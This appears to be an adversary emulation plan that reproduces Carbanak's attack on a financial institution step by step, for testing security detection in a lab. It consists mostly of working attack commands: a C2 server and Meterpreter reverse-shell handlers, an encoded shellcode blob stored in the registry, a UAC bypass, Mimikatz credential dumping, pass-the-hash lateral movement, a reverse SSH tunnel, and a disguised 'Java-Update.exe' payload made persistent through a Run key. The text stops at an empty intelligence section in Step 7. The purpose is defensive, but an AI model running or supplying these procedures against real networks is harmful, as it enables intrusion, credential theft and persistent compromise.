# Preface

For the purpose of this emulation plan, Carbanak operations have been separated into 2 scenarios (detections and protections), with steps and granular procedures contained within each. This division enables users to separately test detection and protection capabilities of their defenses. Within each scenario, operations have been broken into specific objectives, which are presented linearly.

While in Scenario 1 each objective enables subsequent objectives, Scenario 2 is designed such that each objective is run independently of any other. Specifically, this scenario is intended to be used in an environment that does **not** have protective/preventative defense measures enabled, so as to assess detection capabilities. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources. The assessing team can begin at any scenario or objective but should do so understanding that each objective enables succeeding objectives.

This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against which this plan is to be run. For ease of use, a script has been included to automatically make these substitutions, found [here](/Resources/placeholder_substitution). 

---

# Scenario 1 Overview

* Emulation of Carbanak usage of tools such as Carbanak malware, Mimikatz, and PsExec.
* Scenario begins after delivery of a reverse shell payload distributed via spearphishing
* Targeted attack of a financial institution with the explicit goal of monetary theft
* Designed to assess detection capabilities

## Contents

* [Step 0 - Start C2 Server](/Emulation_Plan/Scenario_1#step-0---start-c2-server)
* [Step 1 - Initial Access](#step-1---initial-access)
* [Step 2 - Local Discovery and Collection](#step-2---local-discovery-and-collection)
* [Step 3 - 2<sup>nd</sup> Stage RAT](#step-3---2nd-stage-rat)
* [Step 4 - Domain Discovery and Credential Dumping](#step-4---domain-discovery-and-credential-dumping)
* [Step 5 - Lateral Movement](#step-5---lateral-movement)
* [Step 6 - Discovery](#step-6---discovery)
* [Step 7 - Lateral Movement - CFO](#step-7---lateral-movement---cfo)
* [Step 8 - Execution](#step-8---execution)
* [Step 9 - Collection](#step-9---collection)
* [Step 10 - VNC Persistence](#step-10---vnc-persistence)
* [Acknowledgments](#acknowledgments)
* [Additional Plan Resources](#additional-plan-resources)

## Pre-requisites

Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the [Scenario 1 Infrastructure](./Infrastructure.md) documentation.

---

## Step 0 - Start C2 Server

Before the scenario begins, the attacker needs to start their C2 server to catch their first beacon from the target.

### Procedures

#### 0.A - Start C2 Server

On the `Attack Platform`:

1. Start a new `tmux` session
    
    `tmux`

2. Start the C2 Server
    ```
    cd carbanak/Resources/utilities/carbanak_c2server/c2server
    sudo ./c2server.elf -lhost 0.0.0.0:443 -ssl
    ```
   
---

## Step 1 - Initial Breach

The scenario begins with an initial breach, where a legitimate user opens a Word document and
 clicks on ([T1204](https://attack.mitre.org/versions/v6/techniques/T1204/) / [T1204.002](https://attack.mitre.org/techniques/T1204/002/)) an embedded OLE object, causing an encoded ([T1027](https://attack.mitre.org/techniques/T1027/)) Visual Basic script contained within the object to execute ([T1059.005](https://attack.mitre.org/techniques/T1059/005/)).
 
On execution, this script decodes ([T1140](https://attack.mitre.org/techniques/T1140/)) and writes two files to disk, `starter.vbs` and `TransBaseOdbcDriver.js`. The script then executes `starter.vbs`, which in turn executes `TransBaseOdbcDriver.js` ([T1059.007](https://attack.mitre.org/techniques/T1059/007/)). `TransBaseOdbcDriver.js` is a RAT that establishes encrypted ([T1563.002](https://attack.mitre.org/techniques/T1563/002/)) command and control with the attacker over HTTP/S (TCP 443) ([T1071.001](https://attack.mitre.org/techniques/T1071/001/)).
 
### Procedures

#### 1.A - User Execution: Malicious File (using Microsoft Word) ([T1204.002](https://attack.mitre.org/techniques/T1204/002/))

If testing with Microsoft Word, perform the following. If not, perform [Step 1.A*](#1a---user-execution-malicious-file-without-using-microsoft-word) instead.

On the `Attack Platform`:

1. Open a new `tmux` terminal
    ```
    Ctrl+b c
    ```

2. Copy `1-list.rtf` to `<domain_admin>`'s Desktop on `hrmanager`.
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<hrmanager_ip>/C$ -c "put carbanak/Resources/step1/1-list.rtf Users\\<domain_admin>.<domain>\\Desktop\\1-list.rtf"
    ```
   
    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`

On `hrmanager`:

1. Login to victim workstation as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hrmanager_ip>
    ```

2. Double-click `1-list.rtf` located on `<domain_admin>`'s desktop

3. Decline any spurious prompts, including updating document with linked data

4. Double click the **text** that says "Double Click Here To Unlock"

5. When prompted to run a script, click 'open'

6. Click "ok" when the fake error message displays

You should receive a callback on the C2 server.

#### 1.A* - User Execution: Malicious File (without using Microsoft Word)

Perform the following if you're testing without Office licenses:

On the `Attack Platform`:

1. Open a new `tmux` terminal
    ```
    Ctrl+b c
    ```

2. Copy `drop_payloads.vbe` to `hrmanager`
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<hrmanager_ip>/C$ -c "put carbanak/Resources/step1/drop-payloads.vbe Users\\<domain_admin>.<domain>\\Desktop\\drop-payloads.vbe"
    ```
   
    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`

On hrmanager:

1. Login to victim workstation as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hrmanager_ip>
    ```
    
2. Open `cmd.exe`

3. Manually execute VB script
    ```
    [hrmanager CMD]> cscript.exe C:\Users\<domain_admin>.<domain>\Desktop\drop-payloads.vbe
    ```

4. Make sure you click the 'ok' on the error message box! If you don't, the payload won't execute!

### Cited Intelligence

- Carbanak has created weaponized DOCX and RTF files with malicious files embedded in the documents. Opening and clicking on the image in the file drops and executes an encoded VBScript payload.<sup>[13](https://www.forcepoint.com/blog/x-labs/carbanak-group-uses-google-malware-command-and-control)</sup><sup>, [8](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/)</sup>
- Carbank has used malicious Word documents that when opened drop and execute VBS and JS scripts.<sup>[4](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/operation-grand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/)</sup>

---

## Step 2 - Target Assessment

The attacker executes several discovery scripts that are part of the RAT, which gather information such as device hostname, username, domain ([T1033](https://attack.mitre.org/techniques/T1033/)), CPU architecture ([T1082](https://attack.mitre.org/techniques/T1082/)), and currently running processes ([T1057](https://attack.mitre.org/techniques/T1057/)). These scripts obtain this information by making WMI queries ([T1047](https://attack.mitre.org/techniques/T1047/)) and querying ActiveX networking attributes.

The attacker then uploads ([T1105](https://attack.mitre.org/techniques/T1105/)) and executes a PowerShell script ([T1086](https://attack.mitre.org/techniques/T1059/001/)), which takes a screenshot of the user's desktop ([T1113](https://attack.mitre.org/techniques/T1113/)) and writes the screenshot to disk. The attacker then downloads the resulting screenshot over the existing C2 channel ([T1041](https://attack.mitre.org/techniques/T1041/)), and prepares a handler for the next C2 callback they will receive. 

### Procedures

#### 2.A - Local Discovery ([T1033](https://attack.mitre.org/techniques/T1033/), [T1082](https://attack.mitre.org/techniques/T1082/), [T1057](https://attack.mitre.org/techniques/T1057/))

On the `Attack Platform`:

1. Switch back to the Carbanak C2 server `tmux` terminal

2. Get system information
    ```
    (ATT&CK Evals)> enum-system
    ```

#### 2.B - Screen Capture ([T1113](https://attack.mitre.org/techniques/T1113/))

1. Upload screenshot script
    ```
    (ATT&CK Evals)> upload-file /home/<attacker>/carbanak/Resources/step2/take-screenshot.ps1 "C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.ps1"
    ```

2. Take Screenshot
    ```
    (ATT&CK Evals)> exec-cmd "powershell.exe C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.ps1"
    ```

3. Exfil screenshot file over existing C2 channel
    ```
    (ATT&CK Evals)> download-file "C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.png" /tmp/screenshot__.png
    ```
   
4. Switch to the other `tmux` terminal
    ```
    Ctrl-b + n
    ```

5. Verify "screenshot__.png" download worked
    ```
    <attacker>@<attack_platform>:~$ ls /tmp/
    ```
   
6. Start Metasploit
    ```
    sudo msfconsole
    ```
   
7. Set up TCP listener for Meterpreter on TCP port 8080
    ```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```
   
    This handler is used for Meterpreter callbacks in steps 3 and 5.
   
8. Set up HTTP listener for Meterpreter on TCP port 80
    ```
    set payload windows/x64/meterpreter_reverse_https
    set lport 80
    set ExitOnSession False
    exploit -j
    ```
   
    This handler is used for a Meterpreter callback in step 8.

9. Switch back to C2 server `tmux` window
    ```
    Ctrl+b n
    ```

### Cited Intelligence
- Carbanak malware has the capability to take screen captures of the victim's desktop.<sup>[17](https://www.fireeye.com/blog/threat-research/2019/04/carbanak-week-part-four-desktop-video-player.html)</sup>
- Carbanak VBScript payloads are capable of stealing various system information. Carbanak has also used PowerShell scripts to screenshot victim's desktop and exfil the data using HTTP.<sup>[8](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/)</sup>

---

## Step 3 - Deploy Toolkit

The attacker prepares and deploys a second stage RAT on the victim. First, they write obfuscated ([T1027](https://attack.mitre.org/techniques/T1027/)) shellcode to the Windows Registry using `reg.exe` ([T1112](https://attack.mitre.org/techniques/T1112/)).

The attacker then uploads to disk ([T1105](https://attack.mitre.org/techniques/T1105/)) and executes a PowerShell script ([T1059.001](https://attack.mitre.org/techniques/T1059/001/)) called `LanCradDriver.ps1`. This script reads the shellcode from the registry ([T1012](https://attack.mitre.org/techniques/T1012/)), decodes and decrypts it ([T1140](https://attack.mitre.org/techniques/T1140/)), and then finally injects the shellcode into the current PowerShell process, executing it via a call to CreateThread ([T1055](https://attack.mitre.org/techniques/T1055/)). After execution, the attacker receives a callback over TCP port 8080 ([T1571](https://attack.mitre.org/techniques/T1571/)).

### Procedures

#### 3.A - Stage 2<sup>nd</sup> stage RAT ([T1112](https://attack.mitre.org/techniques/T1112/))

1. Write shellode to Registry

    Note that the shellcode is: 
    - encrypted: XOR with key 'xyz'
    - compressed: Gzip
    - encoded: base64

    `(ATT&CK Evals)>`
    ```
    exec-cmd 'REG ADD "HKCU\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer" /v "{018247B2CAC14652E}" /t REG_SZ /d H4sIAJEshl4C/2sx/Dmnc9KWyqoKC21LTQ1NfSPP1fIGnzQkDD9qJRp91o4y+MShYVh63tjA1GOzgceuK67SLNVhERa7N5ZYV+6YMVXbWhOoMvKjlatR5UqZn4xJxdWlf7mrKio//vgIJI3+7uSTN6xeofnRINHus2WUYcWq2fpG7RusP/t+MqhYAzUTaprTDJ5ukyqzmEJ7xxX8CxSB6uOA6uUsPpYYAtlpQLblp7oPQNMslCwVVRSVrRUslC2VjX5PjbLUbp2haK2obPQ5e7JxW2u7ivExPk4vNU+vyipLfeOP841+Tr1VWVll+GG+4dGKirRXOy5W1VjoGX6YZ/Kh2/KwGX98bfsas4+ThSorqioUrA8F/BKubF0rXGCprqVh4r3RxHuHYesOw8+7wOROiwOTypbOaFtv8GGvUKa1gunnWYafGy0OPLzDJ9m2HujfIoPWbTzzJ7wCef/31CyDDzOA3hSqtVYAK6tasEm9bf3vxio2HaPfe6PUPvQIWVorClZlAJ2qaPSx28hzg/UhxXvac1rXGn7ebfB5P9ABBp87DD8vQtXOGqhkqacsUGlVUWmtIFylZHGgOKzUo229PtD9PCKmEq1rgc6Y4Nbe1mpQsdMgYI/Bnx7es9bt85SEKpUN9+3oOHNDr209AOpTVHH+AQAA'
    ```

#### 3.B - Execute 2<sup>nd</sup> stage RAT ([T1012](https://attack.mitre.org/techniques/T1012/), [T1055](https://attack.mitre.org/techniques/T1055/))

1. Upload shellcode execution script

    ```
    (ATT&CK Evals)> upload-file "/home/<attacker>/carbanak/Resources/step3/reverse.ps1" "C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\LanCradDriver.ps1"
    ```

2. Execute shellode script
    ```
    (ATT&CK Evals)> exec-cmd "powershell.exe -ExecutionPolicy Bypass -NoExit -File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\LanCradDriver.ps1"
    ```

3. Switch to the Meterpreter window
    ```
    Ctrl+b n
    ```

4. Switch to current Meterpreter session
    ```
    msf > sessions -i 1
    ```

### Cited Intelligence

- Carbanak has used PowerShell to execute custom scripts.<sup>[4](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/operation-grand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/)
- Carbanak has employed multiple methods of obfuscation to conceal their activities.<sup>[1](https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf)</sup>
- Carberp has created Registry keys to hide and execute PowerShell commands that execute binary shellcode stored in another key.<sup>[11](https://www.rsa.com/en-us/blog/2017-11/the-carbanak-fin7-syndicate)

---

## Step 4 - Escalate Privileges
In this step, the attacker performs additional discovery before elevating privileges using a UAC bypass to dump credentials. 

First, they examine local files in `<domain_admin>`'s home directory ([T1083](https://attack.mitre.org/techniques/T1083/)). The attacker then calls the `Get-NetComputer` function from the PowerView library, which queries Active Directory objects to return a list of hostnames in the current domain ([T1018](https://attack.mitre.org/techniques/T1018/)). The attacker then executes `Find-LocalAdminAccess`, also from PowerView, to confirm that the attacker has administrator access on the current workstation ([T1069](https://attack.mitre.org/techniques/T1069/)).

With this knowledge, the attacker uploads two files ([T1105](https://attack.mitre.org/techniques/T1105/)) to perform credential dumping: **rad353F7.ps1** (UAC bypass) and **smrs.exe** (customized Mimikatz, called ATTACKKatz in this repository). The attacker executes **rad353F7.ps1** via PowerShell ([T1059.001](https://attack.mitre.org/techniques/T1059/001/)), which in turn executes **smrs.exe** in high integrity ([T1549.002](https://attack.mitre.org/techniques/T1548/002/)). **smrs.exe** dumps plaintext credentials for the current user ([T1003.001](https://attack.mitre.org/techniques/T1003/001/)).

**FAQ About ATTACKkatz.exe**

attackkatz (smrs.exe in step 4.B) leverages the [Logonpasswords](https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords) functionality of Mimikatz to obtain passwords. This dumps LSASS memory to obtain credentials for users on the domain that have logged in to this machine ([T1003.001](https://attack.mitre.org/techniques/T1003/001/)).

### Procedures

#### 4.A - Local and Domain Discovery ([T1083](https://attack.mitre.org/techniques/T1083/), [T1018](https://attack.mitre.org/techniques/T1018/), [T1069](https://attack.mitre.org/techniques/T1069/))

1. Look for files in user home directory
    ```
    meterpreter > ls C:\\Users\\<domain_admin>.<domain>\\
    ```
   
2. Load PowerShell into memory
    ```
    meterpreter > load powershell
    ```
   
3. Import `PowerView` into memory
    ```
    meterpreter > powershell_import /home/<attacker>/carbanak/Resources/step6/powerview.ps1
    ```

4. Execute `PowerView`'s `Get-NetComputer` from memory
    ```
    meterpreter > powershell_execute Get-NetComputer
    ```
    
5. Execute `PowerView`'s `Find-LocalAdminAccess` from memory and write its output to a file on disk
    ```
    meterpreter > powershell_execute "Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt"
    ```
   
    You will likely see an error:

    `Error running command powershell_execute: Rex::TimeoutError Operation timed out.`

    That's okay - don't freak out!

    Meterpreter thinks the script timed out, but it is still running in the background.

    Wait `60` seconds to allow the script to finish.

6. Read the contents of the output file
    ```
    meterpreter > cat C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt
    ```

#### 4.B - UAC Bypass and Credential Dumping ([T1549.002](https://attack.mitre.org/techniques/T1548/002/), [T1003.001](https://attack.mitre.org/techniques/T1003/001/))

1. Upload the UAC Bypass script to `hrmanager` as `rad353F7.ps1`
    ```
    meterpreter > upload /home/<attacker>/carbanak/Resources/step4/uac-bypass.ps1 C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\rad353F7.ps1
    ```
   
2. Upload `attackkatz.exe` to `hrmanager` as `smrs.exe`
    ```
    meterpreter > upload /home/<attacker>/carbanak/Resources/step4/attackkatz.exe C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\smrs.exe
    ```
   
3. Execute the UAC Bypass to script to run `smrs.exe` in an elevated context
    ```
    meterpreter > execute -f powershell.exe -H -i -a "-c C:\Users\<domain_admin>.<domain>\AppData\Roaming\TransbaseOdbcDriver\rad353F7.ps1"
    ```

4. Read Mimikatz output
    ```
    meterpreter > cat "C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\MGsCOxPSNK.txt"
    ```

Note that we now have domain admin creds in hash form and plaintext

### Cited Intelligence
- The Carbank malware contains a UAC bypass.<sup>[16](https://www.fireeye.com/blog/threat-research/2019/04/carbanak-week-part-two-continuing-source-code-analysis.html)</sup>
- Carbanak has used Mimikatz to steal clear text local passwords.<sup>[6](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf), [8](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/), [10](https://go.rsa.com/l/797543/2019-10-11/35g2/797543/11231/The_Shadows_Of_Ghosts_Carbanak_Report.pdf), [11](https://www.rsa.com/en-us/blog/2017-11/the-carbanak-fin7-syndicate), [14](https://www.group-ib.com/resources/threat-research/Anunak_APT_against_financial_institutions.pdf)</sup>
- Carbank operations have included customized versions of PowerSploit.<sup>[4](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/operation-grand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/)</sup>

---

## Step 5 - Expand Access

The attacker uploads several tools to prepare for lateral movement ([T1105](https://attack.mitre.org/techniques/T1105/), ([T1570](https://attack.mitre.org/techniques/T1570/))), after which they use **plink.exe** to SSH into `bankfileserver` ([T1021.004](https://attack.mitre.org/techniques/T1021/004/)), where they list running processes ([T1057](https://attack.mitre.org/techniques/T1057/)) and browse local files ([T1083](https://attack.mitre.org/techniques/T1083/)). The contents of two files they discover provide them with information needed to target the CFO's computer. They then execute `nslookup` to get the domain controller's IP address ([T1018](https://attack.mitre.org/techniques/T1018/)).

With knowledge of the DC IP address, the attacker uses **PsExec.py**, providing a password hash for authentication ([T1550](https://attack.mitre.org/techniques/T1550/002/)), to gain a shell on the DC ([T1569.002](https://attack.mitre.org/techniques/T1569/002/), [T1021.002](https://attack.mitre.org/techniques/T1021/002/)). They then upload and execute a second stage payload, **Tiny.exe**, over this SMB channel to receive a more powerful shell.

### Procedures

#### 5.A - Ingress and Lateral Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/), ([T1570](https://attack.mitre.org/techniques/T1570/)))

1. Upload `pscp.exe` to `hrmanager`
    ```
    meterpreter > upload /home/<attacker>/carbanak/Resources/step5/pscp.exe C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe
    ```

2. Upload `psexec.py` to `hrmanager`
    ```
    meterpreter > upload /home/<attacker>/carbanak/Resources/step5/psexec.py C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\psexec.py
    ```

3. Upload `impacket_exe` to `hrmanager` as `runtime`
    ```
    meterpreter > upload /home/<attacker>/carbanak/Resources/step5/impacket_exe C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\runtime
    ```

4. Upload `plink.exe` to `hrmanager`
    ```
    meterpreter > upload /home/<attacker>/carbanak/Resources/step5/plink.exe C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\plink.exe
    ```

5. Upload `tiny.exe` to `hrmanager`
    ```
    meterpreter > upload /home/<attacker>/carbanak/Resources/step5/tiny.exe C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\tiny.exe
    ```

6. From Meterpreter prompt, drop into an interactive shell
    ```
    meterpreter > shell
    ```

7. Change into the `TransbaceOdbcDriver` directory
    ```
    [hrmanager CMD]> cd C:\Users\<domain_admin>.<domain>\AppData\Roaming\TransbaseOdbcDriver
    ```

8. Use PSCP.exe to copy tools to Linux host
    ```
    [hrmanager CMD]> pscp.exe -scp psexec.py <domain_admin>@<bankfileserver_ip>:/tmp/psexec.py
    ```
    
    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`
    
    If prompted to store key in cache, hit no; this reduces the amount of artifacts we're generating.
    
    ```
    [hrmanager CMD]> pscp.exe -scp runtime <domain_admin>@<bankfileserver_ip>:/tmp/runtime
    ```
    
    ```
    [hrmanager CMD]> pscp.exe -scp tiny.exe <domain_admin>@<bankfileserver_ip>:/tmp/tiny.exe
    ```

#### 5.B - Lateral Movement via SSH ([T1021.004](https://attack.mitre.org/techniques/T1021/004/))

1. Use plink.exe to SSH into CentOS

    ```
    [hrmanager CMD]> plink.exe <domain_admin>@<bankfileserver_ip>
    ```
    
    Enter password when prompted.
    
    Your prompt should look like the following when done:
    
    `[<domain_admin>@bankfileserver ~]$`

2. Process Discovery
    ```
    <domain_admin>@bankfileserver:~$ ps ax
    ```

3. Directory and File Discovery
    ```
    <domain_admin>@bankfileserver:~$ ls -lsahR /var/
    ```

4. Read data from local system
    ```
    <domain_admin>@bankfileserver:~$ cat /var/tmp/network-diagram-financial.xml
    ```

    ```
    <domain_admin>@bankfileserver:~$ cat /var/tmp/help-desk-ticket.txt
    ```

5. DNS Lookup: Domain Controller
    ```
    <domain_admin>@bankfileserver:~$ nslookup bankdc
    ```

#### 5.C - Lateral Movement via PsExec + Pass-the-Hash ([T1569.002](https://attack.mitre.org/techniques/T1569/002/), [T1550](https://attack.mitre.org/techniques/T1550/002/))

1. Change to the `tmp` directory
    ```
    <domain_admin>@bankfileserver:~$ cd /tmp/
    ```

2. Modify permissions on `runtime` to make it world-executable
    ```
    <domain_admin>@bankfileserver:~$ chmod 755 /tmp/runtime
    ```

3. Use `runtime` to execute `psexec.py` with a password hash
    ```
    ./runtime psexec.py <domain_full>/<domain_admin>@<bankdc_ip> -hashes <domain_admin_password_ntlm_hash>
    ```
    
    You should have a shell on the domain controller now.

4. Serve TinyMet over SMB

    From pass-the-hash shell:

    1. Mount attacker SMB share
    
        ```
        [bankdc CMD]> put tiny.exe
        ```

    2. Verify upload worked:
        ```
        [bankdc CMD]> dir C:\Windows | findstr tiny.exe
        ```

    3. Execute TinyMet
        ```
        [bankdc CMD]> start /b C:\Windows\tiny.exe 192.168.0.4 8080
        ```

    You will see a new Meterpreter session.

5. Pull back to interact with the domain controller

    Pay attention to your terminal prompts:

    ```
    C:\windows\system32> exit
    ```
    ```
    [<domain_admin>@bankfileserver tmp]$ exit
    ```
    ```
    C:\Users\<domain_admin>.<domain>\AppData\Roaming\TransbaseOdbcDriver> exit
    ```
    ```
    meterpreter > background
    ```

    You should now be at the msf prompt:
    
    `msf >`

### Cited Intelligence
- Carbanak has used psexec, or other variations, to perform lateral movement and execute remote commands.<sup>[6](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf), [10](https://go.rsa.com/l/797543/2019-10-11/35g2/797543/11231/The_Shadows_Of_Ghosts_Carbanak_Report.pdf)</sup>, <sup>[11](https://www.rsa.com/en-us/blog/2017-11/the-carbanak-fin7-syndicate)</sup>
- Carbanak is known to use TinyMet as a stager to execute Meterpreter as a stage 1 RAT.<sup>[3](https://www.crowdstrike.com/blog/arrests-put-new-focus-on-carbon-spider-adversary-group/)</sup>
- Carbanak has downloaded and utilized pscp and used stolen credentials to access Linux systems via SSH.<sup>[10](https://go.rsa.com/l/797543/2019-10-11/35g2/797543/11231/The_Shadows_Of_Ghosts_Carbanak_Report.pdf)</sup>
- Carbanak has performed pass-the-hash.<sup>[4](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/operation-grand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/)</sup>

---

## Step 6 - Discover Potential Targets

The attacker begins targeting the CFO user from the domain controller. First, they execute **Get-AdComputer** from memory to get detailed information about the CFO user's computer ([T1018](https://attack.mitre.org/techniques/T1018/)), learning their username. The attacker then executes **Get-NetUser** from the **PowerView** library to gather information about the user ([T1087.002](https://attack.mitre.org/techniques/T1087/002/)).

###Procedures

#### 6.A - Remote System Discovery ([T1018](https://attack.mitre.org/techniques/T1018/), [T1087.002](https://attack.mitre.org/techniques/T1087/002/))

1. Interact with bankdc Meterpreter session
    ```
    msf > sessions -i 2
    ```

2. Load PowerShell into memory
    ```
    meterpreter > load powershell
    ```
   
3. Execute `Get-ADComputer` against the `cfo` workstation from memory
    ```
    meterpreter > powershell_execute "Get-ADComputer -Identity 'cfo' -Properties *"
    ```
   
4. Import `PowerView` into memory
    ```
    meterpreter > powershell_import /home/<attacker>/carbanak/Resources/step6/powerview.ps1
    ```
   
5. Execute `PowerView`'s `Get-NetUser` from memory
    ```
    meterpreter > powershell_execute Get-NetUser
    ```

### Cited Intelligence
- Carbanak is known to use Powershell to execute custom scripts that can perform discovery techniques.<sup>[4](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/operation-grand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/), [6](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf)</sup>
- Carbank operations have included customized versions of PowerSploit.<sup>[4](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/operation-grand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/)</sup>

---

## Step 7 - Setup Persistence

Using the information gained in the previous step, the attacker laterally moves to the CFO workstation. They upload **plink.exe** to the domain controller ([T1105](https://attack.mitre.org/techniques/T1105/)), and use it to setup a reverse SSH tunnel to the attacker platform ([T1572](https://attack.mitre.org/techniques/T1572/), [T1021.004](https://attack.mitre.org/techniques/T1021/004/)). The attacker then connects to the DC through this SSH tunnel using RDP ([T1021.001](https://attack.mitre.org/techniques/T1021/001/)). Once on the DC, they execute **qwinsta** to confirm that the CFO user is not logged into their machine ([T1033](https://attack.mitre.org/techniques/T10033/)), after which they RDP into the CFO workstation using domain admin credentials ([T1078.002](https://attack.mitre.org/techniques/T1078/002/)). Lastly, the attacker establishes persistence on the CFO workstation by downloading a reverse shell, writing a starter file, and then adding a Registry Run Key to automatically execute the starter file ([T1547.001](https://attack.mitre.org/techniques/T1547/001/)).  

### Procedures

#### 7.A - RDP through Reverse SSH Tunnel ([T1572](https://attack.mitre.org/techniques/T1572/), [T1021.001](https://attack.mitre.org/techniques/T1021/001/))

1. Upload plink.exe to Domain Controller
    ```
    meterpreter > upload /home/<attacker>/carbanak/Resources/step5/plink.exe C:\\Windows\\Temp\\plink.exe
    ```

2. Spawn an interactive shell
    ```
    meterpreter > shell
    ```

3. Setup reverse SSH tunnel
    ```
    [bankdc CMD]> C:\Windows\Temp\plink.exe -pw "<attacker_ssh_user_password>" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389
    ```
    
    Decline cache key

    Your prompt should now look like: `$`

4. RDP to DC

    From your Ubuntu VM:

    1. Close your RDP session to `hrmanager`

    2. RDP into the DC, using your SSH tunnel:
        ```
        xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:192.168.0.4
        ```

    3. Accept any certificate warnings
     
    RDP will be slower than usual because we're going through an SSH tunnel

#### 7.B - Lateral Movement to CFO via RDP ([T1021.001](https://attack.mitre.org/techniques/T1021/001/))

You should have a RDP session on the Domain controller.

1. Open Administrative PowerShell

2. Check that CFO is NOT logged in currently
    ```
    [bankdc PS ]> qwinsta /server:cfo
    ```

3. Close PowerShell

4. From the domain controller, open the RDP client
    ```
    press the 'windows' key
    type 'remote desktop connection' and press enter
    ```

5. Enter the following creds:
    ```
    Computer:       cfo
    Username:       <domain_full>\<domain_admin>
    Password:       <domain_admin_password>
    ```

    Make sure you are logging in as `<domain_admin>` and NOT `<cfo_user>`

You should now have a nested RDP session to the CFO workstation as user <domain_admin>

#### 7.C - Registry Persistence ([T1547.001](https://attack.mitre.org/techniques/T1547/001/))

1. Open cmd.exe

2. **CONFIRM YOU'RE ON CFO BEFORE PROCEEDING**
    ```
    [CFO CMD ]> hostname
    ```

3. Copy Java-Update.exe from the `Attack Platform`
    ```
    [CFO CMD ]> scp <attacker_ssh_user>@192.168.0.4:/var/files/Java-Update.exe C:\Users\Public\Java-Update.exe
    ```

    If applicable, answer `yes` to "`Are you sure you want to continue connecting?`" Keystrokes _may_ not appear, but they are being captured.

4. When prompted for creds, select the Terminal Icon > Edit > Paste: 

    `<attacker_ssh_user_password>`
    
    Enter the creds manually if copy-paste doesn't work.
    
    Sometimes the SSH client throws 'Protocol Failure' errors. You should be fine as long as Java-Update.exe is there and the file size is the 293,272.

5. Verify Java-Udpdate.exe downloaded correctly
    
    The file size should be '293,272':

    ```
    [CFO CMD ]> dir C:\Users\Public
    ```

6. Run VBS script to launch JavaUpdate.exe
    
    Copy and paste this VBS script into the CFO CMD window.
    
    This script spawns Java-Update.exe in a hidden window.

    ```
    echo Set oShell = CreateObject ("Wscript.Shell") > C:\Users\Public\Java-Update.vbs &
    echo Dim strArgs >> C:\Users\Public\Java-Update.vbs &
    echo strArgs = "C:\Users\Public\Java-Update.exe" >> C:\Users\Public\Java-Update.vbs &
    echo oShell.Run strArgs, 0, false >> C:\Users\Public\Java-Update.vbs
    ```

7. Set Registry Persistence for CFO User
    ```
    [CFO CMD ]> reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Java-Update /t REG_SZ /d C:\Users\Public\Java-Update.vbs
    ```

### Cited Intelligence
